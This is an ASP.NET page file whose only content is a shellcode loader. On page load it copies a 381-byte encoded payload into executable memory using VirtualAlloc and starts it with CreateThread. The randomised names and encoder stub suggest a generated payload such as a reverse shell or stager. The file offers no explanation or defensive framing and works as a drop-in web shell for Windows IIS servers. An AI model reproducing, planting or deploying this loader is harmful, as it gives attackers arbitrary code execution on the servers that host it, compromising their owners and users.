<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] cX2TmO = new byte[381] {
0xda,0xd7,0xb8,0x55,0x5d,0x30,0x57,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x59,0x31,0x43,0x19,0x03,0x43,0x19,0x83,0xc3,0x04,
0xb7,0xa8,0xcc,0xbf,0xb8,0x53,0x2d,0x40,0xa6,0xda,0xc8,0x71,0xf4,0xb9,0x99,0x20,0xc8,0xca,0xcc,0xc8,0xa3,0x9f,0xe4,0xe1,0x4c,
0x94,0x77,0x2a,0xbd,0x1c,0x3d,0x0c,0xf0,0xa2,0x6e,0x6c,0x93,0x5e,0x6d,0xa1,0x73,0x5e,0xbe,0xb4,0x72,0xa7,0x08,0xb2,0x9b,0x75,
0xdc,0xb7,0x31,0x6a,0x69,0x85,0x89,0x8b,0xbd,0x81,0xb1,0xf3,0xb8,0x56,0x45,0x48,0xc2,0x86,0x2e,0x18,0xdc,0x76,0xbb,0xc1,0xfc,
0x77,0x68,0x74,0x35,0x03,0xb2,0x3e,0xf7,0x13,0x41,0xf4,0x7c,0xea,0x83,0xc4,0x42,0x41,0xea,0xe8,0x4e,0x9b,0x2b,0xce,0xb0,0xee,
0x47,0x2c,0x4c,0xe9,0x9c,0x4e,0x8a,0x7c,0x02,0xe8,0x59,0x26,0xe6,0x08,0x8d,0xb1,0x6d,0x06,0x7a,0xb5,0x29,0x0b,0x7d,0x1a,0x42,
0x37,0xf6,0x9d,0x84,0xb1,0x4c,0xba,0x00,0x99,0x17,0xa3,0x11,0x47,0xf9,0xdc,0x41,0x2f,0xa6,0x78,0x0a,0xc2,0xb1,0xfd,0xf3,0x1c,
0xbe,0xa3,0x63,0xd0,0x73,0x5c,0x73,0x7e,0x03,0x2f,0x41,0x21,0xbf,0xa7,0xe9,0xaa,0x19,0x3f,0x78,0xbc,0x99,0xef,0xc2,0xad,0x67,
0x10,0x32,0xe7,0xa3,0x44,0x62,0x9f,0x02,0xe5,0xe9,0x5f,0xaa,0x30,0x87,0x55,0x3c,0x7b,0xff,0x1d,0x53,0x13,0xfd,0xe1,0xba,0xba,
0x88,0x04,0xec,0x12,0xda,0x98,0x4d,0xc3,0x9a,0x48,0x26,0x09,0x15,0xb6,0x56,0x32,0xfc,0xdf,0xfd,0xdd,0xa8,0x88,0x69,0x47,0xf1,
0x43,0x0b,0x88,0x2c,0x2e,0x0b,0x02,0xc4,0xce,0xc2,0xe3,0xad,0xdc,0x33,0x94,0x4d,0x1d,0xc4,0x31,0x4d,0x77,0xc0,0x93,0x1a,0xef,
0xca,0xc2,0x6c,0xb0,0x35,0x21,0xef,0xb7,0xca,0xb4,0xd9,0xcc,0xfd,0x22,0x65,0xbb,0x01,0xa3,0x65,0x3b,0x54,0xa9,0x65,0x53,0x00,
0x89,0x36,0x46,0x4f,0x04,0x2b,0xdb,0xda,0xa7,0x1d,0x8f,0x4d,0xc0,0xa3,0xf6,0xba,0x4f,0x5c,0xdd,0xb8,0x88,0xa2,0xa3,0x96,0x30,
0xca,0x5b,0xa7,0xc0,0x0a,0x36,0x27,0x91,0x62,0xcd,0x08,0x1e,0x42,0x2e,0x83,0x77,0xca,0xa5,0x42,0x35,0x6b,0xb9,0x4e,0x9b,0x35,
0xba,0x7d,0x00,0xc6,0xc1,0x0e,0xb7,0x27,0x36,0x07,0xdc,0x28,0x36,0x27,0xe2,0x15,0xe0,0x1e,0x90,0x58,0x30,0x25,0xab,0xef,0x15,
0x0c,0x26,0x0f,0x09,0x4e,0x63 };

        IntPtr yJWm = VirtualAlloc(IntPtr.Zero,(UIntPtr)cX2TmO.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(cX2TmO,0,yJWm,cX2TmO.Length);
        IntPtr qOxt5wUvopIs = IntPtr.Zero;
        IntPtr jpVVLSNR9AL = CreateThread(IntPtr.Zero,UIntPtr.Zero,yJWm,IntPtr.Zero,0,ref qOxt5wUvopIs);
    }
</script>